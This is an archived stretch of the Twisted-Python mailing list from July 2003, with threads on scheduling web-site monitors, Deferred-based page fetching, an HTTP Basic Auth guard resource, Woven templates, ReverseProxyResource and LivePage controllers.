Look at twisted.web.monitor.
Basically, most of this is fairly easy with Twisted.

> I write a "monicron". monicron wakes up every five minutes and asks the
> system "are there any monitors that need to be performed right now?" The
> answer will either be "Yes, here's the monitors that need to be
> performed right now" or "No".
> 
> If No, monicron will just go back to bed for another five minutes.
> 
> If the answer is Yes monicron will gather the monitors that need to be
> run, and execute the all at once -- asyncronously. It would then need to
> collect the results of all the monitors, and once they've all reported
> back for a given site, send an error report if something went wrong.

That sounds like the worst impelemntation strategy I could think
of. Wouldn't it be saner to have each task have its own scheduling?

> 2. If Yes, where should I start looking for the bits of the framework
> that will make my task as easy as possible?

Read the documentation?
Seriously, read all of it. I can't imagine many parts which wouldn't
be relevant.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From brad at bbnet.ca  Wed Jul 16 09:57:58 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 11:57:58 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <pan.2003.07.16.15.47.03.115396@smurf.noris.de>
References: <20030716152520.GA19537@xdsk200> <pan.2003.07.16.15.47.03.115396@smurf.noris.de>
Message-ID: <20030716155758.GA19921@xdsk200>

On Wed, Jul 16, 2003 at 05:47:05PM +0200, Matthias Urlichs wrote:
> Hi, Brad Bollenbach wrote:
> 
> > I write a "monicron". monicron wakes up every five minutes and asks the
> > system "are there any monitors that need to be performed right now?" The
> > answer will either be "Yes, here's the monitors that need to be
> > performed right now" or "No".
> 
> Why don't you write a function that finds the earliest monitor job which
> needs to run next, and delay for exactly that amount?

Because it's known that monitors can be run at either 5 or 15 minute
intervals. To wake up every five minutes is the simplest.

In any case, this is just an implementation detail, outside the point of
whether or not Twisted is what I'm looking for to minimize the amount of
time and effort needed to getting a running, sellable system.

--
Brad Bollenbach



From brad at bbnet.ca  Wed Jul 16 10:04:30 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 12:04:30 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716174504.V15104@amaze.nl>
References: <20030716152520.GA19537@xdsk200> <20030716174504.V15104@amaze.nl>
Message-ID: <20030716160430.GB19921@xdsk200>

On Wed, Jul 16, 2003 at 05:45:04PM +0200, Ivo van der Wijk wrote:
> On Wed, Jul 16, 2003 at 11:25:20AM -0400, Brad Bollenbach wrote:

[snippity snip snip]

> > So, my main use case (possibly) relevant to Twisted would be:
> > 
> > I write a "monicron". monicron wakes up every five minutes and asks the
> > system "are there any monitors that need to be performed right now?" The
> > answer will either be "Yes, here's the monitors that need to be
> > performed right now" or "No".
> > 
> > If No, monicron will just go back to bed for another five minutes.
> > 
> > If the answer is Yes monicron will gather the monitors that need to be
> > run, and execute the all at once -- asyncronously. It would then need to
> > collect the results of all the monitors, and once they've all reported
> > back for a given site, send an error report if something went wrong.
> > 
> > 1. Does this sound Twisted?
> > 
> 
> Somewhat. You need to make very sure your system doesn't block unexpectedly :)

I'm not sure how you (or Twisted) define "unexpected", but I probably
want things to block when -- for example -- I try to retrieve a page
from a certain URL.

I certainly don't want to be writing state machines.

> > 2. If Yes, where should I start looking for the bits of the framework
> > that will make my task as easy as possible?
> > 
> 
> I have a rather ugly Twisted script which might give you a start (it does the 
> checking at intervals, gathering results / setting timeouts, etc).
> 
> If you're interested, I could try to cleanup the code a bit.

Yeah, I'd be interested in looking at that.

Regards,

--
Brad Bollenbach
BBnet.ca



From peter at engcorp.com  Wed Jul 16 10:12:28 2003
From: peter at engcorp.com (Peter Hansen)
Date: Wed, 16 Jul 2003 12:12:28 -0400
Subject: [Twisted-Python] How Twisted is This?
References: <20030716152520.GA19537@xdsk200> <pan.2003.07.16.15.47.03.115396@smurf.noris.de>
Message-ID: <3F15796C.D928EA92@engcorp.com>

Matthias Urlichs wrote:
> 
> Hi, Brad Bollenbach wrote:
> 
> > I write a "monicron". monicron wakes up every five minutes and asks the
> > system "are there any monitors that need to be performed right now?" The
> > answer will either be "Yes, here's the monitors that need to be
> > performed right now" or "No".
> 
> Why don't you write a function that finds the earliest monitor job which
> needs to run next, and delay for exactly that amount?

One good reason to do the "every five minutes check" thing instead of
"wait exactly this long based on a precalculated value" thing is that
if the things to be monitored can be added or removed dynamically,
interrupting the sleep is more difficult than it's worth, while the 
blind periodic check is much simpler and more robust.

-Peter



From brad at bbnet.ca  Wed Jul 16 10:24:01 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 12:24:01 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716155250.13563.qmail@green.zadka.com>
References: <20030716152520.GA19537@xdsk200> <20030716155250.13563.qmail@green.zadka.com>
Message-ID: <20030716162401.GA19959@xdsk200>

On Wed, Jul 16, 2003 at 03:52:50PM -0000, Moshe Zadka wrote:
> On Wed, 16 Jul 2003, Brad Bollenbach <brad at bbnet.ca> wrote:
> 
> > * branded for the company I work for 
> 
> I'm not sure what this means.

It means that the user interfaces will be branded for the company I work
for.

> > * multiuser 
> 
> I'm not sure what this mean either.

It means there will be more than one user that will use this service.

> > * offer various ways of verifying the uptime and integrity of content on
> > a site:
> > 
> >     i. Can I open an HTTP connection to this site?
> >     ii. Is "foo bar" present on the page that I've retrieved?
> >     iii. Is the page I've retrieved the same size as it was before?
> >     iv. Is Basic Auth still working with this username/password? (for
> >     pages that do Basic Auth, of course :)
> 
> Look at twisted.web.monitor.
> Basically, most of this is fairly easy with Twisted.

This looks like a useful, albeit minimal, starting point.

> > I write a "monicron". monicron wakes up every five minutes and asks the
> > system "are there any monitors that need to be performed right now?" The
> > answer will either be "Yes, here's the monitors that need to be
> > performed right now" or "No".
> > 
> > If No, monicron will just go back to bed for another five minutes.
> > 
> > If the answer is Yes monicron will gather the monitors that need to be
> > run, and execute the all at once -- asyncronously. It would then need to
> > collect the results of all the monitors, and once they've all reported
> > back for a given site, send an error report if something went wrong.
> 
> That sounds like the worst impelemntation strategy I could think
> of. Wouldn't it be saner to have each task have its own scheduling?

Well, you didn't say anything about what specifically seemed bad about
the (very generic description of an) implementation I mentioned, so
there's no point considering other alternatives without having at least
considered the first one.

The metaphor I suggested maps well into the Real World (e.g. think of a
SWAT team that has to enter and "clear" a building; each cell is
deployed to their own piece of the building, but all have to report back
to one central command, otherwise there's no way to know if there's an
"all clear" or not).

> > 2. If Yes, where should I start looking for the bits of the framework
> > that will make my task as easy as possible?
> 
> Read the documentation?
> Seriously, read all of it. I can't imagine many parts which wouldn't
> be relevant.

Well, there's loads of it that's not relevant to my problem. A more
constructive pointer than "read all of it" would be useful, but I'll
look to more pragmatic sources to find that pointer. :)

--
Brad Bollenbach



From radix at twistedmatrix.com  Wed Jul 16 10:38:51 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 16 Jul 2003 12:38:51 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716160430.GB19921@xdsk200>
References: <20030716152520.GA19537@xdsk200> <20030716174504.V15104@amaze.nl> <20030716160430.GB19921@xdsk200>
Message-ID: <20030716163851.GA1259@radii>

On Wed, Jul 16, 2003 at 12:04:30PM -0400, Brad Bollenbach wrote:
> On Wed, Jul 16, 2003 at 05:45:04PM +0200, Ivo van der Wijk wrote:

> > Somewhat. You need to make very sure your system doesn't block
> > unexpectedly :)
> 
> I'm not sure how you (or Twisted) define "unexpected", but I probably
> want things to block when -- for example -- I try to retrieve a page
> from a certain URL.

"unexpectedly" means "at all" :-)

Are you sure you _really_ mean this? Is there some user interface bit
that you're implying when you say you want it to block? Do you just
mean that you want to wait for some tasks to complete before you start
others? If so, then that's not blocking, and Twisted is still
appropriate.

> I certainly don't want to be writing state machines.

That's how Twisted works. But it's not annoying if you have a good
standard library of state machines already :-) For example,
twisted.web.client and/or twisted.web.monitor already exist, so all
you would have to do to implement the web checker (using t.w.client)
is this (I'm assuming you know the basics of Deferreds)::

from twisted.web import client
class WebChecker:
    def doIt(self, url):
        return client.getPage(url,
                   ).addCallback(self.gotPage, url
                   ).addErrback(self.reportError, url)

    def gotPage(self, page, url):
        print "hooray, got page %s" % url
        #self.checkForFoo(page, url), etc

    def reportError(self, failure, url):
        print ":( There was a problem in %s" % url
        print failure

To try out this code, do

from twisted.internet import reactor
WebChecker().doIt('http://twistedmatrix.com/'
    ).addCallback(lambda *a: reactor.stop())
reactor.run()

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From bob at redivi.com  Wed Jul 16 10:40:51 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 16 Jul 2003 12:40:51 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <3F15796C.D928EA92@engcorp.com>
Message-ID: <42CC22C2-B7AC-11D7-AB7F-000A95686CD8@redivi.com>

On Wednesday, Jul 16, 2003, at 12:12 America/New_York, Peter Hansen 
wrote:

> Matthias Urlichs wrote:
>>
>> Hi, Brad Bollenbach wrote:
>>
>>> I write a "monicron". monicron wakes up every five minutes and asks 
>>> the
>>> system "are there any monitors that need to be performed right now?" 
>>> The
>>> answer will either be "Yes, here's the monitors that need to be
>>> performed right now" or "No".
>>
>> Why don't you write a function that finds the earliest monitor job 
>> which
>> needs to run next, and delay for exactly that amount?
>
> One good reason to do the "every five minutes check" thing instead of
> "wait exactly this long based on a precalculated value" thing is that
> if the things to be monitored can be added or removed dynamically,
> interrupting the sleep is more difficult than it's worth, while the
> blind periodic check is much simpler and more robust.

I don't necessarily agree with that.  With the "every five minutes 
check" you have to write your own callLater mechanism, when you let 
tasks schedule themselves, you don't.  Also with the "every five 
minutes check" you're using computer+bandwidth resources in a much less 
sane manner, it sure as hell isn't going to scale awfully well.

-bob




From radix at twistedmatrix.com  Wed Jul 16 10:43:19 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 16 Jul 2003 12:43:19 -0400
Subject: [Twisted-Python] Passing mx.DateTime objects to PB
In-Reply-To: <20030716154907.13430.qmail@green.zadka.com>
References: <200307161831.28533.egor@iplus.ru> <20030716154907.13430.qmail@green.zadka.com>
Message-ID: <20030716164319.GB1259@radii>

On Wed, Jul 16, 2003 at 03:49:07PM -0000, Moshe Zadka wrote:
> On Wed, 16 Jul 2003, Egor Cheshkov <egor at iplus.ru> wrote:
> 
> > Hello! Another beginner's question. How can I pass mx.DateTime
> > objects to and from PB remote method calls? Should I create a
> > subclass of mx.DateTime and pb.Copyable?
> 
> A. Did everyone drink copying juice today or something? Stop copying classes,
> people. Most of the time, you want remote references. Really.

I can't imagine why you'd want to use a Referenceable for a DateTime
object. Copying probably _is_ what he should be using.

> C. It doesn't appear that Jelly or PB support components, precluding
> that strategy. Am I wrong? Is there a way to use components?

I started this way back at PyCon, but never finished it. I didn't want
to implement it for this generation of PB when there's a newer one in
the, uhm, toaster.

So, for now, there's going to have to be a new class. :-(

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From lafou at wanadoo.fr  Wed Jul 16 11:18:00 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 16 Jul 2003 19:18:00 +0200
Subject: [Twisted-Python] dealing with woven templates.
Message-ID: <1058375880.2919.26.camel@biproc>

Hi all,

I have some (noob) problems with woven. I tried to create a standard
template, with 1 picture. I modified the template from picturepile. Here
is what I have :

  <html>
    <head>
      <title model="title" view="Text">Directory listing</title>
    </head>
    <body>
      <img src="pictures/TwistedLogoFull.png" alt="Twisted logo"
border="0" />
      <h1 model="title" view="Text">This is the title</h1>
      <ul model="directory" view="List">
        <li pattern="listItem"><a view="Anchor"
href="#">ListItem</a></li>
        <li pattern="emptyList">This directory is empty.</li>
      </ul>
    </body>
  </html>

This works since /pictures is in the templates directory. Moreover, I
can see where the items would be, and their link (#).

But I get no image at all while rendering with woven and the
picturepile.py exemple. On the otherhand, all items begin with
"ListItem"

This is tedious since web designers should see something similar to the
final result.

By the way, I got this error :

exceptions.AttributeError: 'NoneType' object has no attribute
'toprettyxml'

because the app couldn't find the template file. This message isn't
explicit enough I think :(

thx for your help




From brad at bbnet.ca  Wed Jul 16 11:24:40 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 13:24:40 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716163851.GA1259@radii>
References: <20030716152520.GA19537@xdsk200> <20030716174504.V15104@amaze.nl> <20030716160430.GB19921@xdsk200> <20030716163851.GA1259@radii>
Message-ID: <20030716172440.GA20186@xdsk200>

On Wed, Jul 16, 2003 at 12:38:51PM -0400, Christopher Armstrong wrote:
> On Wed, Jul 16, 2003 at 12:04:30PM -0400, Brad Bollenbach wrote:
> > On Wed, Jul 16, 2003 at 05:45:04PM +0200, Ivo van der Wijk wrote:
> 
> > > Somewhat. You need to make very sure your system doesn't block
> > > unexpectedly :)
> > 
> > I'm not sure how you (or Twisted) define "unexpected", but I probably
> > want things to block when -- for example -- I try to retrieve a page
> > from a certain URL.
> 
> "unexpectedly" means "at all" :-)

*blinks*

> Are you sure you _really_ mean this? Is there some user interface bit
> that you're implying when you say you want it to block? Do you just
> mean that you want to wait for some tasks to complete before you start
> others? If so, then that's not blocking, and Twisted is still
> appropriate.
> 
> > I certainly don't want to be writing state machines.
> 
> That's how Twisted works. But it's not annoying if you have a good
> standard library of state machines already :-) For example,
> twisted.web.client and/or twisted.web.monitor already exist, so all
> you would have to do to implement the web checker (using t.w.client)
> is this (I'm assuming you know the basics of Deferreds)::

Well, I'm sure I mean I want to block.

Unless I don't (in which case Twisted would have to prove to me that I
don't).

Here's an example use case for a monitoring check:

1. open web page and store cookie that it gives us
2. did we get the page ok? (yes)
3. submit the form with values foo=bar and baz=spam (and the cookie we 
got in step 1)
4. did the response get retrieved ok? (yes)
5. is the string "Welcome to blah blah blah" present in this page? (no)
6. return a "NOT OK" for this monitor

Using a state machine for this seems like too much complexity, compared
to just starting a thread and letting me simply block so I can do these
checks procedurally (albeit inside a method, if you know what I mean).

> from twisted.web import client
> class WebChecker:
>     def doIt(self, url):
>         return client.getPage(url,
>                    ).addCallback(self.gotPage, url
>                    ).addErrback(self.reportError, url)
> 
>     def gotPage(self, page, url):
>         print "hooray, got page %s" % url
>         #self.checkForFoo(page, url), etc
> 
>     def reportError(self, failure, url):
>         print ":( There was a problem in %s" % url
>         print failure
> 
> To try out this code, do
> 
> from twisted.internet import reactor
> WebChecker().doIt('http://twistedmatrix.com/'
>     ).addCallback(lambda *a: reactor.stop())
> reactor.run()

Thanks for this example.

I'll mull over this and see if I can mold it into the different checks I
need to perform, and whether or not state-machinery will make life
easier or more complex.

--
Brad Bollenbach



From David.McCurley at technologist.com  Wed Jul 16 13:00:26 2003
From: David.McCurley at technologist.com (David McCurley)
Date: 16 Jul 2003 15:00:26 -0400
Subject: [Twisted-Python] HTTP Authentication Example for review
Message-ID: <1058382026.30109.19.camel@mars.mccurleyweb.net>

Below is some example code I've been using to restrict access to certain
parts of my site to only the users I want.  I've started simple with
hard coded user/pwd stuff and tried to make a clean example for others
to look at to verify this looks to be a correct approach with twisted. 
Please take a look and give me some feedback.  Know a better way? See
any holes? Maybe I should be looking and doing something to the protocol
stuff instead of the resource approach?

This resource is intented to be plugged into part of the resource tree
and guard everything below it.  It could be at the root or somewhere
below.

Note that in production, user accounts will be associated with groups,
and allowed paths can be attached to users and/or groups.  I'm going to
implement this after I have covered the basics.

The one thing so far that I don't like (ref MyGuard) is that it looks
like I have to do checks in the following methods (at least):

render()
getChild()
getChildWithDefault()
getChildForRequest()



Example code:
=============================

class MyAuth(baseRes):
    isLeaf = True
    def __init__(self):
        baseRes.__init__(self)
    def render(self, request):
        request.setHeader('WWW-authenticate', 'Basic realm="%s"' %
("default",))
        errpage = error.ErrorPage(http.UNAUTHORIZED,"Unauthorized","401
Authentication required")
        return errpage.render(request)
    def getChild(self, name, request):
            return self
        
class MyGuard(baseRes):
    def __init__(self, userName="test", password="test"):
        baseRes.__init__(self)
        self.uName = userName
        self.pWord = password
        
    def render(self, request):
        auth = self.checkUser(request)
        if auth:
            return auth.render(request)
        return
"<html><head><title>MyGuard</title></head><body><h1>MyGuard</h1></body></html>"
            
    def getChild(self, name, request):
        auth = self.checkUser(request)
        if auth:
            return auth
        if name == '':
            return self
        return baseRes.getChild(self, name, request)
        
    def getChildWithDefault(self, path, request):
        auth = self.checkUser(request)
        if auth:
            return auth
        return baseRes.getChildWithDefault(self, path, request)
        
    def getChildForRequest(self, request):
        auth = self.checkUser(request)
        if auth:
            return auth
        return baseRes.getChildForRequest(self, request)
        
    def checkUser(self, request):
        if not request.getUser() or not request.getPassword():
            return MyAuth()
        else:
            user = request.getUser()
            pwd = request.getPassword()
        if user != self.uName or pwd != self.pWord:
            return MyAuth()
        else:
            return None
=============================

Thx!




From radix at twistedmatrix.com  Wed Jul 16 13:52:49 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 16 Jul 2003 15:52:49 -0400
Subject: [Twisted-Python] HTTP Authentication Example for review
In-Reply-To: <1058382026.30109.19.camel@mars.mccurleyweb.net>
References: <1058382026.30109.19.camel@mars.mccurleyweb.net>
Message-ID: <20030716195249.GC1259@radii>

On Wed, Jul 16, 2003 at 03:00:26PM -0400, David McCurley wrote:
> The one thing so far that I don't like (ref MyGuard) is that it looks
> like I have to do checks in the following methods (at least):
> 
> render()
> getChild()
> getChildWithDefault()
> getChildForRequest()

No, you only need to override render and
getChildWithDefault. getChildForRequest will call getChildWithDefault,
and getChildWithDefault is responsible for calling getChild. So as
long as you have isLeaf=True, getChildWithDefault will catch any
getChild.

> class MyAuth(baseRes):
>     isLeaf = True

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From lafou at wanadoo.fr  Wed Jul 16 14:22:53 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 16 Jul 2003 22:22:53 +0200
Subject: [Twisted-Python] dealing with woven templates.
In-Reply-To: <1058375880.2919.26.camel@biproc>
References: <1058375880.2919.26.camel@biproc>
Message-ID: <1058386973.2894.31.camel@biproc>

I found a solution for the "/pictures" dir pb.

I have to add this :

def wchild_pictures(self, request):
        return static.File(os.path.join(self.templateDirectory,"pictures"))

to DirectoryListing(page.Page) class.

I can do it with all Pages in web site by creating a master class (ie :

class MyPage(page.Page):
	def wchild_pictures(self, request):
        	return static.File(os.path.join(self.templateDirectory,"pictures"))

But I still have the pb with the links.


I also took a look at generated code, it's quite ugly. Is there a way to have a incremented
output ?




From David.McCurley at technologist.com  Wed Jul 16 14:46:46 2003
From: David.McCurley at technologist.com (David McCurley)
Date: 16 Jul 2003 16:46:46 -0400
Subject: [Twisted-Python] HTTP Authentication Example for review
In-Reply-To: <20030716195249.GC1259@radii>
References: <1058382026.30109.19.camel@mars.mccurleyweb.net>
	 <20030716195249.GC1259@radii>
Message-ID: <1058388406.30283.5.camel@mars.mccurleyweb.net>

But MyGuard doesn't have isLeaf=True because its not a leaf.  Its at the
top of some resource tree/subtree that it guards.  

I thought I had some type of problem with setting isLeaf=True in MyGuard
and it not giving me the behavior I wanted (maybe only if it was the
root resource).  That is, if I'm remembering the other night correctly
:)  Maybe I'll read through the source again so I can figure out again
why I don't have isLeaf.  I'm almost sure there is/was a reason.

Thx!


On Wed, 2003-07-16 at 15:52, Christopher Armstrong wrote:
> On Wed, Jul 16, 2003 at 03:00:26PM -0400, David McCurley wrote:
> > The one thing so far that I don't like (ref MyGuard) is that it looks
> > like I have to do checks in the following methods (at least):
> > 
> > render()
> > getChild()
> > getChildWithDefault()
> > getChildForRequest()
> 
> No, you only need to override render and
> getChildWithDefault. getChildForRequest will call getChildWithDefault,
> and getChildWithDefault is responsible for calling getChild. So as
> long as you have isLeaf=True, getChildWithDefault will catch any
> getChild.
> 
> > class MyAuth(baseRes):
> >     isLeaf = True




From peter at engcorp.com  Wed Jul 16 14:53:05 2003
From: peter at engcorp.com (Peter Hansen)
Date: Wed, 16 Jul 2003 16:53:05 -0400
Subject: [Twisted-Python] How Twisted is This?
References: <42CC22C2-B7AC-11D7-AB7F-000A95686CD8@redivi.com>
Message-ID: <3F15BB31.27794375@engcorp.com>

Bob Ippolito wrote:
> 
> On Wednesday, Jul 16, 2003, at 12:12 America/New_York, Peter Hansen
> wrote:
> 
> > One good reason to do the "every five minutes check" thing instead of
> > "wait exactly this long based on a precalculated value" thing is that
> > if the things to be monitored can be added or removed dynamically,
> > interrupting the sleep is more difficult than it's worth, while the
> > blind periodic check is much simpler and more robust.
> 
> I don't necessarily agree with that.  With the "every five minutes
> check" you have to write your own callLater mechanism, when you let
> tasks schedule themselves, you don't.  Also with the "every five
> minutes check" you're using computer+bandwidth resources in a much less
> sane manner, it sure as hell isn't going to scale awfully well.

Mentioning callLater makes this an implementation question now, whereas
I believe both Brad and I were talking from a more general point of view.
I was, anyway.  From a general point of view, I'm right ;-), because
you simply don't have to worry about issues related to adding or removing
items, or changing the time delays of them as you would if you calculated
the delay until the next activity and went to sleep for that long.

As for bandwidth: I'm of the "premature optimization is bad" school
of thought, and it's far too early in this discussion to be worrying
about a few microseconds of CPU usage per day...

-Peter



From radix at twistedmatrix.com  Wed Jul 16 14:56:53 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 16 Jul 2003 16:56:53 -0400
Subject: [Twisted-Python] HTTP Authentication Example for review
In-Reply-To: <1058388406.30283.5.camel@mars.mccurleyweb.net>
References: <1058382026.30109.19.camel@mars.mccurleyweb.net> <20030716195249.GC1259@radii> <1058388406.30283.5.camel@mars.mccurleyweb.net>
Message-ID: <20030716205653.GE1259@radii>

On Wed, Jul 16, 2003 at 04:46:46PM -0400, David McCurley wrote:
> But MyGuard doesn't have isLeaf=True because its not a leaf.  Its at the
> top of some resource tree/subtree that it guards.  
> 
> I thought I had some type of problem with setting isLeaf=True in MyGuard
> and it not giving me the behavior I wanted (maybe only if it was the
> root resource).  That is, if I'm remembering the other night correctly
> :)  Maybe I'll read through the source again so I can figure out again
> why I don't have isLeaf.  I'm almost sure there is/was a reason.

Sorry, I was out of whack. You indeed do not need isLeaf. And you
still only need to override getChildWithDefault and render, not the
other two, whether it's the root resource or not.


-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From glyph at twistedmatrix.com  Wed Jul 16 16:04:24 2003
From: glyph at twistedmatrix.com (Glyph Lefkowitz)
Date: Wed, 16 Jul 2003 17:04:24 -0500
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716172440.GA20186@xdsk200>
Message-ID: <7619641B-B7D9-11D7-953B-000393C9700E@twistedmatrix.com>

On Wednesday, July 16, 2003, at 12:24 PM, Brad Bollenbach wrote:

> Using a state machine for this seems like too much complexity, compared
> to just starting a thread and letting me simply block so I can do these
> checks procedurally (albeit inside a method, if you know what I mean).

Keep in mind that nothing in Twisted is thread safe, so you will have 
to write a state machine to process the results of your threaded 
calculations anyway.  State machines are really the point of Twisted.  
The framework itself is a huge repository of different techniques and 
examples for making writing state machines easy.

If you're going to write a bunch of blocking I/O in threads, you might 
as well write your own framework.  You literally won't be able to 
safely call any Twisted code that way.  As an aside, running lots of 
threaded clients will tend to scale much more poorly than multiplexing 
them all.




From bob at redivi.com  Wed Jul 16 16:39:09 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 16 Jul 2003 18:39:09 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <3F15BB31.27794375@engcorp.com>
Message-ID: <50E4C45B-B7DE-11D7-8336-000A95686CD8@redivi.com>

On Wednesday, Jul 16, 2003, at 16:53 America/New_York, Peter Hansen 
wrote:

> Bob Ippolito wrote:
>>
>> On Wednesday, Jul 16, 2003, at 12:12 America/New_York, Peter Hansen
>> wrote:
>>
>>> One good reason to do the "every five minutes check" thing instead of
>>> "wait exactly this long based on a precalculated value" thing is that
>>> if the things to be monitored can be added or removed dynamically,
>>> interrupting the sleep is more difficult than it's worth, while the
>>> blind periodic check is much simpler and more robust.
>>
>> I don't necessarily agree with that.  With the "every five minutes
>> check" you have to write your own callLater mechanism, when you let
>> tasks schedule themselves, you don't.  Also with the "every five
>> minutes check" you're using computer+bandwidth resources in a much 
>> less
>> sane manner, it sure as hell isn't going to scale awfully well.
>
> Mentioning callLater makes this an implementation question now, whereas
> I believe both Brad and I were talking from a more general point of 
> view.

I said "your own callLater mechanism", meaning "your own code that 
doesn't do anything very different from callLater".  We're talking 
about using a particular framework here anyways, and the claim I'm 
making is that this framework already has a well-designed and tested 
implementation this particular functionality and it'd be silly to write 
your own.

> I was, anyway.  From a general point of view, I'm right ;-), because
> you simply don't have to worry about issues related to adding or 
> removing
> items, or changing the time delays of them as you would if you 
> calculated
> the delay until the next activity and went to sleep for that long.

How can you not have to worry about adding or removing items to a list 
of recurring tasks?  You have the same list of tasks for either 
approach.  Calculating the number of seconds in 5 minutes isn't any 
harder for a "waker" than it is for whatever function is scheduling 
your tasks.. it's simple, the answer is minutes*60.0, which is 300.0 
seconds in this case.  With a "wakerless" approach you can have the 
tasks scheduled at different sorts of intervals, and even non-constant 
intervals (i.e. exponential backoff).  If you have a "waker" that 
supports this kind of functionality, that manages a list of stuff that 
should happen after variable intervals of time, finds the minimum, and 
sleeps for that long, you just rewrote part of the reactor.  The good 
thing about using pieces of the twisted framework that already exist is 
that you don't have to write them, they generally have tests, and 
generally work extremely well.

> As for bandwidth: I'm of the "premature optimization is bad" school
> of thought, and it's far too early in this discussion to be worrying
> about a few microseconds of CPU usage per day...

It's not a premature optimization, it's a different way of designing 
the networking core of this "company branded salable application" that 
happens to be easier and more scalable.  For example, a process can 
only acquire some fixed number of file handles (sockets) before it 
starts to get really-hard-to-handle errors.  If you try and open up X 
connections at the same time, you're much more likely to run into this 
error given enough sites to check, it's something you really have to 
watch out for when writing a web spider, for example.  It just doesn't 
make sense to intentionally design something that behaves like: 
______/\___________/\_____ when you really have an extremely 
parallelizable task at hand.  Checking site A is in no way dependent on 
checking site B, so there's no reason to intentionally make them happen 
at the same time if you know better.  We're not talking about a whole 
lot of code here.  Leveraging the fact that 99% of what needs to be 
done is glue code between stuff that's already in twisted, a prototype 
of his application could be easily be done in less than fifty lines 
using the scalable approach.  In fact, I think that the "wake up and do 
stuff every N minutes" approach would actually end up being a longer 
and easier to screw up implementation.

-bob




From David.McCurley at technologist.com  Wed Jul 16 17:19:07 2003
From: David.McCurley at technologist.com (David McCurley)
Date: 16 Jul 2003 19:19:07 -0400
Subject: [Twisted-Python] ReverseProxy Usage
Message-ID: <1058397547.30283.14.camel@mars.mccurleyweb.net>

I assumed that if I put a reverse proxy resource in twisted, it would
reverse proxy to another site.  It seems that it doesn't do fixups on
the returned html?  So it won't really reverse proxy, it will just
scrape a single page from a remote site?

Or maybe I'm using it wrong?

Here is the scenarion:

I made a simple test resource file call "/tmp/t1.rpy" that has the
following code:

================

from twisted.web import resource, proxy

resource = proxy.ReverseProxyResource('www.google.com', 80, '/')

================

I used mktap to make a static resource (mktap web --path) that points to
/tmp.  Now when I run it, I get a dir listing of /tmp.  I click on
t1.rpy and that shows me the google home page. 

However, the images don't work and none of the links work.  They weren't
fixed up to have the "../t1.rpy" stuff prepended to them like I expected
and am used to with reverse proxies.

Can anyone clarify this for me?

Thanks!




From tim.andrews at adpro.com.au  Wed Jul 16 18:41:46 2003
From: tim.andrews at adpro.com.au (Tim Andrews)
Date: Thu, 17 Jul 2003 10:11:46 +0930
Subject: [Twisted-Python] (no subject)
Message-ID: <MIEKLAIKJGMEAEJNJKJACEPPCAAA.tim.andrews@adpro.com.au>

Hi twisted,

I've just started playing with twisted and am keen to get something
happening with  LivePage. I can serve pages quite happily from an .rpy and
have tried to follow the examples from the manual to get event handlers and
LivePage happening.  When my page is generated "MyController.handle" gets
called, but "MyController.setUp" never gets called.  If I add an "__init__"
method it gets called, but when I try to call "self.view.addEventHandler" it
complains that self.view is a NoneType.

I have also tried subclassing input.Anything, but suffer from a similar
problem in that my "initialize" method never gets called or if I call
"input.Anything.__init__" then I still have a problem with
"self.view.addEventHandler"

FYI I'm running twisted 1.06 on Python 2.2 on a Windows 2000 box

My code for your perusal ...

from twisted.web.woven import page, controller

model = {
    'name': 'fred',
    'stuff': ['Foo', 'Bar', 'Baz']
}

template = """
  <html>
  <body>
  <h3 model="name" view="Text"  controller = "foo"/>
  <div model="stuff" view="List">
  <li pattern="listItem" view="Text"/>
  </div>
  <span view="webConduitGlue" />
  </body>
  </html>
"""

class MyController(controller.Controller):

#  def __init__(self, *args, **kwargs):
#    controller.Controller.__init__(self, args, kwargs)
#    self.view.addEventHandler("onmouseover", self.mouse) # self.view =
NoneType :(

  def setUp(self, request, *args):
    print "setUp" # this never happens :(

  def handle(self, request):
    print 'handle' # this happens :)

  def mouse(self, request, widget):
    print 'Mouse Over!!!'


class MyPage(page.LivePage):

  def wcfactory_foo(self, request, node, model):
    print 'foo factory' # this happens :)
    return MyController(model)


resource = MyPage(model, template=template)


Thanks,

Tim


----------------------------------------
Tim Andrews
Principal Hardware Engineer

Vision Fire and Security
14 Park Way, Technology Park
Mawson Lakes, S.A. 5095

ph: +61-8-84621201
fax: +61-8-84621001
email: Tim.Andrews at adpro.com.au
web site: www.adpro.com.au

----------------------------------------
IMPORTANT ? This email and any attachments may be confidential. Any
